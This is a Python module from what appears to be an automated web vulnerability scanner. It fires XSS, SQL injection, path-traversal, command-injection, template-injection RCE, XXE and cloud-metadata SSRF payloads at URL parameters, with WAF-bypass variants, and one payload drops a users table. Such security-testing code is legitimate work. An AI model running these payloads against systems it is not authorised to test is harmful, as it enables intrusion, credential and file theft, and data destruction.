import sys
import os
import re
import asyncio
import time
import random
from typing import List, Dict, Optional
from urllib.parse import quote, urlencode, urlsplit, urlunsplit, parse_qsl, urlparse
from core.async_network import AsyncNetworkEngine
from core.ui import B, C, G, N, R, W, Y, i, p, s, w
from modules.auth.bypass import WAFBypass
from core.network import thttp
from runners.shared import inject_query_payload


class SmartPayloadGenerator:
    """Context-aware payload selection with WAF bypass variants."""

    XSS_BASE = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "\"'><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
    ]
    SQLI_BASE = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' OR '1' = '1",
        "1' OR 1=1--",
        "admin' --",
        "' UNION SELECT NULL--",
        "' AND 1=1--",
        "'; DROP TABLE users--",
    ]
    LFI_BASE = [
        "../../../../etc/passwd",
        "../../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "../../../../etc/shadow",
        "file:///etc/passwd",
        "/etc/passwd",
        "../../../../../../etc/passwd",
    ]
    RCE_BASE = [
        "; id;",
        "| id",
        "`id`",
        "$(id)",
        "; ping -c 1 127.0.0.1;",
        "| ping -c 1 127.0.0.1",
        "& whoami &",
        "| echo LSE_TEST; id",
        "'; id;'",
        "$(whoami)",
    ]
    SSTI_BASE = [
        "{{1337*7331}}",
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{7*'7'}}",
        "<%= 7*7 %>",
        # Jinja2 fingerprint
        "{{config.items()}}",
        "{{self.__dict__}}",
        # Jinja2 RCE via gadgets
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # Mako
        "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
        # Twig (PHP)
        "{{['id']|filter('system')}}",
        # Freemarker (Java)
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    ]

    @staticmethod
    def generate(vuln_type: str, bypass: bool = True) -> List[str]:
        if vuln_type == "xss":
            base = SmartPayloadGenerator.XSS_BASE
        elif vuln_type == "sqli":
            base = SmartPayloadGenerator.SQLI_BASE
        elif vuln_type == "lfi":
            base = SmartPayloadGenerator.LFI_BASE
        elif vuln_type == "rce":
            base = SmartPayloadGenerator.RCE_BASE
        elif vuln_type == "ssti":
            base = SmartPayloadGenerator.SSTI_BASE
        else:
            return ["test"]

        results = list(base)
        if bypass:
            for b in base[:4]:
                if vuln_type == "xss":
                    results.extend(WAFBypass.encode_xss(b))
                elif vuln_type == "sqli":
                    results.extend(WAFBypass.encode_sqli(b))
                elif vuln_type == "lfi":
                    results.extend(WAFBypass.encode_lfi(b))
                elif vuln_type == "rce":
                    results.extend(WAFBypass.encode_rce(b))
                elif vuln_type == "ssti":
                    results.extend(WAFBypass.encode_ssti(b))
        # Deduplicate & preserve priority order
        results = list(dict.fromkeys(results))
        return results


class ParamClassifier:
    """Classify URL parameter names and dispatch appropriate check methods."""

    @staticmethod
    def get_checks(engine, url: str, param: str) -> List:
        checks = []
        param_lower = param.lower()

        if param_lower in ("id", "user_id", "account", "num", "number", "order"):
            checks.extend([engine.idor_checks, engine.sqli])

        is_url = any(x in param_lower for x in ["url", "redirect", "next", "dest", "callback", "return", "uri", "link", "target", "domain", "fetch"])
        is_file = any(x in param_lower for x in ["file", "path", "doc", "document", "page", "folder", "include", "dir", "read", "load", "template_file"])
        is_exec = any(x in param_lower for x in ["cmd", "exec", "command", "ping", "host", "ip", "eval", "process", "run", "shell"])
        is_template = any(x in param_lower for x in ["template", "view", "theme", "lang", "tpl", "layout", "render"])
        is_json = any(x in param_lower for x in ["json", "data", "body", "payload", "query", "filter", "search", "q"])

        if is_exec:
            checks.extend([engine.rce, engine.sqli, engine.ssti])
        elif is_url:
            checks.extend([engine.ssrf, engine.open_redirect, engine.xss])
        elif is_file:
            checks.extend([engine.lfi, engine.sqli])
        elif is_template:
            checks.extend([engine.ssti, engine.xss])
        elif is_json:
            checks.extend([engine.sqli, engine.xss, engine.ssti])
        else:
            checks.extend([engine.xss, engine.sqli])

        # Deduplicate while preserving order
        seen = set()
        unique_checks = []
        for c in checks:
            if c not in seen:
                seen.add(c)
                unique_checks.append(c)
        return unique_checks


class AsyncVulnEngine:
    """Async internal vulnerability checks for parameterized targets."""

    def __init__(
        self,
        network_engine: AsyncNetworkEngine,
        session_manager=None,
        concurrency: int = 25,
        bypass: bool = True,
    ):
        self.engine = network_engine
        self.session_manager = session_manager
        self.concurrency = concurrency
        self.bypass = bypass
        self._sem = asyncio.Semaphore(concurrency)

    async def _send(self, url: str, method: str = "GET", headers: dict = None,
                    data=None, timeout: int = 10, bypass: bool = None) -> Dict:
        async with self._sem:
            hostname = urlparse(url).hostname or "unknown"
            req_headers = dict(headers or {})

            # Origin IP passthrough: inject Host header + use curl --resolve for SNI
            if hostname and hostname.replace(".", "").isdigit():
                origin_domain = None
                if self.session_manager and self.session_manager.auth_tokens:
                    for domain in self.session_manager.auth_tokens:
                        if domain and not domain.replace(".", "").isdigit():
                            origin_domain = domain
                            req_headers.setdefault("Host", domain)
                            break
                # Use curl --resolve for proper SNI when scanning origin IP
                if origin_domain:
                    from core.curl_send import curl_send
                    result = await asyncio.to_thread(
                        curl_send, url,
                        resolve_domain=origin_domain, resolve_ip=hostname,
                        method=method, headers=req_headers, data=data,
                        timeout=timeout,
                    )
                    return result

            # Normal path: use httpx
            result = await self.engine.ahttp_send(
                url,
                method=method,
                headers=req_headers,
                data=data,
                timeout=timeout,
                bypass=self.bypass if bypass is None else bypass,
                state_context=self.session_manager,
            )
            return result

    async def xss(self, url: str, param: str) -> Optional[Dict]:
        payloads = SmartPayloadGenerator.generate("xss", self.bypass)[:12]
        triggers = [r"alert\(1\)", r"prompt\(1\)", r"confirm\(1\)", r"onerror=", r"onload=", r"onfocus=", r"ontoggle="]
        baseline = await self._send(url)
        baseline_body = baseline.get("body", "")

        targets = [(inject_query_payload(url, param, p), p) for p in payloads]
        tasks = [self._send(t[0]) for t in targets]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (target, payload), r in zip(targets, responses):
            if isinstance(r, dict) and r.get("status", 0) > 0 and r.get("body"):
                body = r["body"]
                for trigger in triggers:
                    if re.search(trigger, body, re.I) and not re.search(trigger, baseline_body, re.I):
                        if "&lt;script" in body.lower() or "&lt;img" in body.lower() or "&lt;svg" in body.lower():
                            continue
                        if payload.startswith("<") and payload[:4].lower() not in body.lower():
                            continue
                        return {"type": "reflected_xss", "title": "Reflected XSS", "url": target[:200],
                                "detail": f"Param: {param}, Trigger: {trigger}", "bypass": "enabled" if self.bypass else "none",
                                "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0),
                                "confidence": "confirmed"}
        return None

    async def sqli(self, url: str, param: str) -> Optional[Dict]:
        payloads = SmartPayloadGenerator.generate("sqli", self.bypass)[:10]
        error_patterns = [r"sql syntax", r"unclosed quotation", r"warning: mysql", r"sqlite_error", r"postgresql.*error", r"ora-[0-9]{5}"]
        
        parsed_path = urlparse(url).path
        i(f"[SQLi] Testing parameter {Y}'{param}'{N} on {C}{parsed_path}{N} (Error-based & Time-based)")

        baseline = await self._send(inject_query_payload(url, param, "1"), timeout=12)
        baseline_body = baseline.get("body", "")
        baseline_mean = baseline.get("time", 0.5)

        targets = [(inject_query_payload(url, param, p), p) for p in payloads]
        tasks = [self._send(t[0]) for t in targets]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (target, payload), r in zip(targets, responses):
            if isinstance(r, dict) and r.get("status", 0) > 0:
                body = r.get("body") or ""
                if any(re.search(ep, body, re.I) and not re.search(ep, baseline_body, re.I) for ep in error_patterns):
                    s(f"SQLi (Error-based) CONFIRMED on {Y}{param}{N} with payload: {C}{payload}{N}")
                    return {"type": "sqli_error", "title": "SQL Injection (Error-based)", "url": target[:200],
                            "detail": f"Param: {param}", "bypass": "enabled" if self.bypass else "none",
                            "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}

        threshold = max(4.0, baseline_mean + 3.0)

        for payload in ["' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"]:
            target = inject_query_payload(url, param, payload)
            r = await self._send(target, timeout=25)
            elapsed = r.get("time", 0)
            if elapsed - baseline_mean >= threshold:
                ctrl_target = inject_query_payload(url, param, "' AND '1'='1")
                ctrl_r = await self._send(ctrl_target, timeout=10)
                ctrl_elapsed = ctrl_r.get("time", 0)
                if ctrl_elapsed < baseline_mean + 2.0:
                    s(f"SQLi (Time-based) CONFIRMED on {Y}{param}{N}! Delay: {elapsed:.2f}s (Control: {ctrl_elapsed:.2f}s)")
                    return {"type": "sqli_time", "title": "SQL Injection (Time-based)", "url": target[:200],
                            "detail": f"Param: {param}, Delay: {elapsed:.1f}s (baseline: {baseline_mean:.1f}s, threshold: {threshold:.1f}s)",
                            "bypass": "enabled" if self.bypass else "none",
                            "waf": "/".join(r.get("waf", [])), "time": elapsed, "status": r.get("status", 0),
                            "confidence": "confirmed"}
        return None

    async def lfi(self, url: str, param: str) -> Optional[Dict]:
        indicators = [r"root:x:0:0:", r"daemon:x:", r"bin:x:", r"\[fonts\]"]
        payloads = SmartPayloadGenerator.generate("lfi", self.bypass)[:10]
        targets = [(inject_query_payload(url, param, p), p) for p in payloads]
        tasks = [self._send(t[0]) for t in targets]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (target, payload), r in zip(targets, responses):
            if isinstance(r, dict) and r.get("status", 0) > 0:
                body = r.get("body") or ""
                if any(re.search(ind, body, re.I) for ind in indicators):
                    return {"type": "lfi", "title": "Local File Inclusion (LFI)", "url": target[:200],
                            "detail": f"Param: {param}", "bypass": "enabled" if self.bypass else "none",
                            "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def rce(self, url: str, param: str) -> Optional[Dict]:
        indicators = [r"uid=\d+\(\w+\)", r"gid=\d+\(\w+\)", r"www-data"]
        payloads = SmartPayloadGenerator.generate("rce", self.bypass)[:12]
        targets = [(inject_query_payload(url, param, p), p) for p in payloads]
        tasks = [self._send(t[0]) for t in targets]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (target, payload), r in zip(targets, responses):
            if isinstance(r, dict) and r.get("status", 0) > 0:
                body = r.get("body") or ""
                if any(re.search(ind, body, re.I) for ind in indicators):
                    return {"type": "rce", "title": "RCE / Command Injection", "url": target[:200],
                            "detail": f"Param: {param}", "bypass": "enabled" if self.bypass else "none",
                            "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def ssrf(self, url: str, param: str) -> Optional[Dict]:
        test_urls = [
            ("http://169.254.169.254/latest/meta-data/", ["meta-data", "ami-id", "instance-id"]),
            ("http://metadata.google.internal/computeMetadata/v1/instance/", ["instance-id", "Metadata-Flavor", "computeMetadata"]),
            ("http://localhost:22", ["SSH-", "OpenSSH"]),
            ("http://127.0.0.1:80", ["Server:", "HTTP/1."]),
        ]
        targets = [(inject_query_payload(url, param, tu), indicators) for tu, indicators in test_urls]
        tasks = [self._send(t[0], timeout=12) for t in targets]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (target, indicators), r in zip(targets, responses):
            if isinstance(r, dict) and r.get("status", 0) > 0:
                body = r.get("body") or ""
                headers_str = str(r.get("headers") or "")
                combined = body + "\n" + headers_str
                if any(ind in combined for ind in indicators):
                    return {"type": "ssrf", "title": "Server-Side Request Forgery (SSRF)", "url": target[:200],
                            "detail": f"Param: {param}", "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def ssti(self, url: str, param: str) -> Optional[Dict]:
        payloads = SmartPayloadGenerator.generate("ssti", self.bypass)[:10]
        baseline = await self._send(inject_query_payload(url, param, "1"), timeout=12)
        baseline_body = baseline.get("body", "")
        expected_results = ["9801547", "49", "7777777"]

        targets = [(inject_query_payload(url, param, p), p) for p in payloads]
        tasks = [self._send(t[0]) for t in targets]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (target, payload), r in zip(targets, responses):
            if isinstance(r, dict) and r.get("status", 0) > 0 and r.get("body"):
                body = r["body"]
                for result in expected_results:
                    if result in body and result not in baseline_body:
                        return {"type": "ssti", "title": "SSTI (Server-Side Template Injection)", "url": target[:200],
                                "detail": f"Param: {param}, Match: {result}", "bypass": "enabled" if self.bypass else "none",
                                "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def xxe(self, url: str, param: str) -> Optional[Dict]:
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ]
        for p in payloads:
            r = await self._send(url, method="POST", data=p, headers={"Content-Type": "text/xml"}, timeout=12, bypass=False)
            if r.get("status", 0) > 0 and "root:x:0:0:" in (r.get("body", "") or ""):
                return {"type": "xxe_file", "title": "XXE (XML External Entity)", "url": url[:200],
                        "detail": "File read via XXE", "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def config_checks(self, url: str) -> List[Dict]:
        paths = {
            "/.env": [r"(?i)(?:DB_|API_|SECRET_|APP_|AWS_|PORT=|\bKEY\b\s*=)"],
            "/.git/config": [r"\[core\]", r"repositoryformatversion"],
            "/.htaccess": [r"(?i)(?:RewriteEngine|RewriteCond|RewriteRule|AuthType|Require)"],
            "/crossdomain.xml": [r"<cross-domain-policy"],
            "/admin": [r"(?i)(?:login|username|password|sign in|dashboard|form)"],
            "/config.php.bak": [r"<?php", r"\$db", r"define\("],
            "/.git/HEAD": [r"ref:\s*refs/"],
        }
        findings = []
        for path, patterns in paths.items():
            target = url.rstrip("/") + path
            r = await self._send(target, timeout=10, bypass=False)
            if r.get("status") == 200:
                body = r.get("body", "") or ""
                body_lower = body.lower()
                not_found_keywords = [
                    "404 not found", "page not found", "error 404", "cannot find", 
                    "does not exist", "doesn't exist", "site template", "invalid request",
                    "not found on this server", "find what you're looking for"
                ]
                if len(body) > 20 and not any(x in body_lower for x in not_found_keywords):
                    is_valid = any(re.search(pat, body) for pat in patterns)
                    if is_valid:
                        findings.append({
                            "type": "config_exposure",
                            "title": f"Config/Path Exposure: {path}",
                            "url": target[:200],
                            "detail": f"Exposed: {path}",
                            "waf": "/".join(r.get("waf", [])),
                            "time": r.get("time", 0),
                            "status": r.get("status", 0)
                        })
        return findings

    async def header_checks(self, url: str) -> Optional[Dict]:
        r = await self._send(url, timeout=10, bypass=False)
        headers = {k.lower(): v for k, v in r.get("headers", {}).items()}
        findings = []
        if headers.get("x-frame-options") is None:
            findings.append({"type": "misconfig_header", "title": "Missing X-Frame-Options", "url": url[:200],
                             "detail": "Clickjacking protection missing", "waf": "", "time": r.get("time", 0), "status": r.get("status", 0)})
        if headers.get("content-security-policy") is None:
            findings.append({"type": "misconfig_header", "title": "Missing CSP Header", "url": url[:200],
                             "detail": "No Content-Security-Policy", "waf": "", "time": r.get("time", 0), "status": r.get("status", 0)})
        if headers.get("x-content-type-options") is None:
            findings.append({"type": "misconfig_header", "title": "Missing X-Content-Type-Options", "url": url[:200],
                             "detail": "MIME-sniffing protection missing", "waf": "", "time": r.get("time", 0), "status": r.get("status", 0)})
        return findings if findings else None

    async def open_redirect(self, url: str, param: str) -> Optional[Dict]:
        canaries = ["google.com", "example.com"]
        payloads = [
            "https://google.com",
            "//google.com",
            r"/\/google.com",
            "https:google.com",
            "https://example.com",
            "//example.com",
        ]
        for payload in payloads:
            target = inject_query_payload(url, param, payload)
            r = await self._send(target, timeout=10, bypass=False)
            headers = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
            location = headers.get("location", "")
            if r.get("status") in (301, 302, 303, 307, 308) and any(canary in location for canary in canaries):
                return {"type": "open_redirect", "title": "Open Redirect", "url": target[:200],
                        "detail": f"Redirects to: {location}", "waf": "/".join(r.get("waf", [])),
                        "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def cors_checks(self, url: str) -> Optional[Dict]:
        r = await self._send(url, headers={"Origin": "https://evil.com"}, timeout=10, bypass=False)
        headers = {k.lower(): str(v).lower() for k, v in (r.get("headers") or {}).items()}
        acao = headers.get("access-control-allow-origin")
        acac = headers.get("access-control-allow-credentials")
        if acao == "https://evil.com" and acac == "true":
            return {"type": "cors_misconfig", "title": "CORS Misconfig (Credentials Allowed)", "url": url,
                    "detail": "Arbitrary origin https://evil.com reflected with ACAC: true",
                    "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def idor_checks(self, url: str, param: str) -> Optional[Dict]:
        if not re.search(rf"{re.escape(param)}=\d+", url):
            return None
        baseline = await self._send(url, timeout=10, bypass=False)
        baseline_body = baseline.get("body") or ""
        new_url = re.sub(rf"({re.escape(param)}=)(\d+)", r"\g<1>0", url)
        r = await self._send(new_url, timeout=10, bypass=False)
        body = r.get("body") or ""
        if r.get("status") == 200 and baseline.get("status") == 200 and len(body) > 50:
            diff_ratio = abs(len(body) - len(baseline_body)) / max(len(baseline_body), 1)
            body_lower = body.lower()
            not_found = ["not found", "invalid id", "unauthorized", "access denied", "error", "does not exist"]
            if diff_ratio > 0.15 and not any(nf in body_lower for nf in not_found):
                return {"type": "idor", "title": "IDOR (Insecure Direct Object Reference)", "url": new_url[:200], "detail": f"Param: {param}",
                        "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
        return None

    async def scan_param(self, url: str, param: str) -> List[Dict]:
        findings = []
        checks = ParamClassifier.get_checks(self, url, param)
        for check in checks:
            try:
                result = await check(url, param)
                if result:
                    if isinstance(result, list):
                        findings.extend(result)
                    else:
                        findings.append(result)
            except Exception:
                continue
        return findings

    async def scan_many(self, targets: List[tuple]) -> List[Dict]:
        """Scan multiple (url, param) pairs concurrently."""
        tasks = [self.scan_param(url, param) for url, param in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        findings = []
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
            elif isinstance(r, dict):
                findings.append(r)
        return findings

class VulnVerifier:
    """Re-verify findings to eliminate false positives."""

    SQL_ERRORS = [r"sql syntax", r"unclosed quotation", r"warning: mysql", r"sqlite_error", r"postgresql.*error", r"ora-[0-9]{5}"]
    LFI_MARKERS = [r"root:x:0:0:", r"daemon:x:", r"bin:x:", r"\[fonts\]"]
    RCE_MARKERS = [r"uid=\d+\(\w+\)", r"gid=\d+\(\w+\)", r"www-data", r"nt authority\\system"]

    @staticmethod
    def _with_payload(url: str, payload: str) -> str:
        parts = urlsplit(url)
        query = parse_qsl(parts.query, keep_blank_values=True)
        if query:
            payload_hints = ["<", ">", "'", '\"', "../", ";", "{{", "alert(",
                             "sleep(", "waitfor", "1=1", "1=2", "null", "true",
                             "false", "onerror", "onload", "svg", "script"]
            target_idx = 0
            for i, (k, v) in enumerate(query):
                v_lower = v.lower()
                if any(h in v_lower for h in payload_hints):
                    target_idx = i
                    break
            key, _ = query[target_idx]
            query[target_idx] = (key, payload)
        else:
            query = [("verd_verify", payload)]
        return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(query), parts.fragment))

    @staticmethod
    def _body_has_any(body: str, patterns: List[str]) -> bool:
        return any(re.search(p, body or "", re.I) for p in patterns)

    @staticmethod
    async def verify(finding: Dict, engine, session_manager=None,
                     allow_post: bool = True) -> bool:
        vtype = finding["type"]
        url = finding["url"]

        if "xss" in vtype:
            proof = "<svg/onload=confirm(1)>"
            r = await engine.ahttp_send(VulnVerifier._with_payload(url, proof), state_context=session_manager)
            body = r.get("body", "")
            return r["status"] > 0 and proof in body

        elif "sqli" in vtype:
            if vtype == "sqli_time":
                baseline = await engine.ahttp_send(VulnVerifier._with_payload(url, "1"), timeout=12, state_context=session_manager)
                delayed = await engine.ahttp_send(VulnVerifier._with_payload(url, "' AND SLEEP(5)-- -"), timeout=15, state_context=session_manager)
                return delayed.get("time", 0) - baseline.get("time", 0) >= 4
            probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "'"), timeout=12, state_context=session_manager)
            return probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.SQL_ERRORS)

        elif vtype == "lfi":
            probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "../../../../etc/passwd"), timeout=12, state_context=session_manager)
            return probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.LFI_MARKERS)

        elif vtype == "rce":
            probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "; id;"), timeout=12, state_context=session_manager)
            return probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.RCE_MARKERS)

        elif vtype == "ssti":
            baseline = await engine.ahttp_send(VulnVerifier._with_payload(url, "verd_verify"), timeout=12, state_context=session_manager)
            probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "{{1337*7331}}"), timeout=12, state_context=session_manager)
            expected = "9801547"
            return probe["status"] > 0 and expected in probe.get("body", "") and expected not in baseline.get("body", "")

        elif vtype == "xxe_file":
            if not allow_post:
                # Re-verify XXE = POST body XML. Mode non-4 tidak boleh POST:
                # pakai confidence yang sudah ada, tanpa request tambahan.
                return finding.get("confidence") == "confirmed"
            payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
            probe = await engine.ahttp_send(url, method="POST", data=payload, headers={"Content-Type": "text/xml"}, timeout=12, state_context=session_manager)
            return probe["status"] > 0 and "root:x:0:0:" in probe.get("body", "")

        elif vtype == "open_redirect":
            probe = await engine.ahttp_send(url, timeout=12, state_context=session_manager)
            location = probe.get("headers", {}).get("location", "")
            return probe["status"] in (301, 302, 303, 307, 308) and any(c in location for c in ["google.com", "example.com"])

        elif vtype == "cors_misconfig":
            probe = await engine.ahttp_send(url, headers={"Origin": "https://evil.com"}, timeout=12, state_context=session_manager)
            headers = probe.get("headers", {})
            return headers.get("access-control-allow-origin") == "https://evil.com"

        elif vtype in {"auth_bypass", "http_smuggling"}:
            return finding.get("confidence") == "confirmed"

        elif vtype == "broken_auth":
            return finding.get("confidence") == "confirmed"

        elif vtype == "subdomain_takeover":
            return finding.get("confidence", "suspected") != "weak"

        elif vtype == "dom_xss":
            return finding.get("confidence", "suspected") != "weak"

        elif vtype.startswith("js_secret_"):
            return finding.get("confidence", "confirmed") != "weak"

        elif vtype.startswith("blind_"):
            return finding.get("confidence", "confirmed") != "weak"

        elif vtype == "info_disclosure":
            return finding.get("confidence") == "confirmed" and finding.get("status") in (200, 403)

        elif vtype in {"admin_panel", "misconfig_header", "google_dork", "js_endpoint", "param_discovery"}:
            return finding.get("confidence", "confirmed") != "weak"

        elif vtype in {
            "api_endpoint", "public_admin_api", "unauthenticated_api_data",
            "api_schema_exposed", "graphql_introspection", "dangerous_methods_allowed",
            "protected_api_endpoint", "auth_data_publicly_accessible", "api_auth_delta",
        }:
            return finding.get("confidence", "confirmed") != "weak"

        return finding.get("confidence") == "confirmed"


class HeuristicVulnEngine:
    """Advanced risk analysis for WAF and variables."""

    RISKY_PARAMS = ["id", "url", "file", "path", "page", "cmd", "exec", "query", "search", "lang", "redirect", "dest", "to", "callback"]

    @staticmethod
    def analyze_param_risk(param: str) -> int:
        if param.lower() in HeuristicVulnEngine.RISKY_PARAMS:
            return 9
        if any(p in param.lower() for p in ["key", "token", "pass"]):
            return 7
        return 3

    @staticmethod
    def waf_risk_test(url: str, wafs: List[str], policy=None) -> Dict:
        if not wafs:
            return {"risk": "Low", "reason": "No WAF detected"}
        payload = "<script>alert(1)</script>"
        r = thttp(url + "?test=" + quote(payload), bypass=False, policy=policy)
        if r["status"] == 200 and payload in (r["body"] or ""):
            return {"risk": "Low", "reason": f"WAF ({'/'.join(wafs)}) is misconfigured — payloads pass through unblocked."}
        return {"risk": "Critical", "reason": f"WAF ({'/'.join(wafs)}) is active and blocks basic XSS."}
